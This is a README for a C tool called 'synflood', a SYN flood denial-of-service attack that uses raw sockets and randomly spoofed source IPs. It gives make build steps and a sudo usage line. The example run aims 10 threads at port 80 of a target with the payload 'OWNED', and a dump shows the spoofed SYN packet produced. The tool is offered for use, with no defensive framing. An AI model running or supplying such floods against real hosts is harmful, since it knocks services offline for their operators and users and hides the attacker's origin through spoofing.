# synflood
SYN flood denial-of-service (DoS) attack coded in C using raw sockets. Generates random spoofed IPs at each new packet.

## Build

`make clean` <br>
`make`

## Usage

`sudo ./synflood <target_ip_address> <payload> <number_of_threads> <port_number>`

## Example

`sudo ./synflood 1.2.3.4 OWNED 10 80`

Will create 10 threads which will send the following TCP/IP packet in loop:

```
***********************TCP Packet*************************

Ethernet Header
   |-Destination Address : XX-XX-XX-XX-XX-XX
   |-Source Address      : XX-XX-XX-XX-XX-XX  
   |-Protocol            : 8

IP Header
   |-IP Version        : 4
   |-IP Header Length  : 5 DWORDS or 20 Bytes
   |-Type Of Service   : 0
   |-IP Total Length   : 54  Bytes(Size of Packet)
   |-Identification    : 6082
   |-TTL               : 255
   |-Protocol          : 6
   |-Checksum          : 55149
   |-Source IP         : xxx.xxx.xxx.xxx
   |-Destination IP    : 1.2.3.4

TCP Header
   |-Source Port          : 28659
   |-Destination Port     : 80
   |-Sequence Number      : 0
   |-Acknowledge Number   : 0
   |-Header Length        : 5 DWORDS or 20 BYTES
   |-Urgent Flag          : 0
   |-Acknowledgement Flag : 0
   |-Push Flag            : 0
   |-Reset Flag           : 0
   |-Synchronise Flag     : 1
   |-Finish Flag          : 0
   |-Window               : 5840
   |-Checksum             : 41290
   |-Urgent Pointer       : 0

                        DATA Dump                         
Data Payload
    4F 57 4E 45 44 00 00 00 00 00 00 00 00 00               OWNED.........
```
